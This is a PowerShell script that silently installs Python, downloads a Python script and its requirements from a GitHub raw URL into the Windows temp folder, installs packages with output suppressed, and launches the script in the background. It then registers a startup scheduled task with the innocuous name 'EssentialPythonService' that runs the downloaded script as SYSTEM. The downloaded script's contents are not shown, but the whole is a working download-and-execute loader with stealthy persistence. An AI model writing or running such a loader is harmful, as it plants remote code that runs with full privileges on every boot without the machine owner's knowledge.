# Search the python executable
$pythonPath = Get-Command python -ErrorAction SilentlyContinue

# If python executable is not found, install python
if (-not $pythonPath) {
    # Define the URL for the Python installer
    $installerUrl = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
    
    # Define the path for the downloaded installer
    $installerPath = "$env:TEMP\python_installer.exe"

    # Download the Python installer
    Write-Output "Downloading Python installer..."
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

    # Install Python silently
    Write-Output "Installing Python..."
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -NoNewWindow -Wait

    # Verify installation
    $pythonPath = Get-Command python -ErrorAction SilentlyContinue
    if ($pythonPath) {
        Write-Output "[!] Python installed successfully."
    } else {
        Write-Output "[x] Python installation failed."
    }

    # Clean up
    Remove-Item -Path $installerPath -Force
} else {
    Write-Output "[!] Python is already installed."
}

# Fetch the python executable path
$pythonPath = [System.IO.Path]::GetDirectoryName($pythonPath.Source)
$pythonPath = "$pythonPath\python.exe"

######################################################## Here finish the python installation


# Download the python script directly with invoke-webrequest
$outDirectory = "$env:TEMP"		# Temp directory in Windows
Write-Output "[!] Temp directory: $outDirectory"

$repoUrl = "https://raw.githubusercontent.com/NeronNymus/Secuserver/refs/heads/main/scripts/secuserver2.py"
$requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/Secuserver/refs/heads/main/requirements.txt"
$scriptPath = "${outDirectory}/secuserver2.py"
$requirementsPath = "${outDirectory}/requirements.txt"

# Check if scriptPath already exists
if (Test-Path $scriptPath) {
    # If it exists, delete it
    Remove-Item $scriptPath -Force
    Write-Output "[!] File '$scriptPath' deleted."
}


# Try to make the web requests
try {
	# Download the repository and requirements
	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
    Write-Output "[!] Scripts downloaded successfully."

    # Install the Python packages from requirements.txt
    Write-Output "[!] Installing Python packages..."
    & python -m pip install --upgrade pip *> $null
    & python -m pip install -r $requirementsPath *> $null

    Write-Output "[!] Python packages installed successfully."

} catch {
    # Check if the file already exists
    if (Test-Path -Path $scriptPath) {
        Write-Output "[!] The file already exists at $scriptPath."
    } else {
        Write-Output "[!] The file $scriptPath does not exist and could not be downloaded."
    }
}

# Call the downloaded script if exist
if (Test-Path -Path $scriptPath) {
	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)

    # Start the Python script in the background
	Start-Process -FilePath $pythonPath -ArgumentList $scriptPath -NoNewWindow -RedirectStandardOutput "${scriptPathNoExtension}_log" -RedirectStandardError "${scriptPathNoExtension}_Errorlog"
    Write-Output "[*] Python script started in the background."
	#Write-Output "[*] $pythonPath $scriptPath"
} else {
    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
}


# Schedule Task for every startup
$TaskName = "EssentialPythonService"
$action = New-ScheduledTaskAction -Execute $pythonPath -Argument "`"$scriptPath`""

$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal
try{
    Register-ScheduledTask -TaskName "$TaskName" -InputObject $task -ErrorAction SilentlyContinue
} catch{    
    Write-Output "[!] Schedule $TaskName already exist!"
}

# Verify if the task was created successfully
$scheduledTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if ($scheduledTask) {
    Write-Output "[!] Task '$taskName' was created successfully."
    # Optional: Display detailed information about the task
    $scheduledTask | Format-List *
} else {
    Write-Output "[!] Task '$taskName' could not be found or was not created."
}
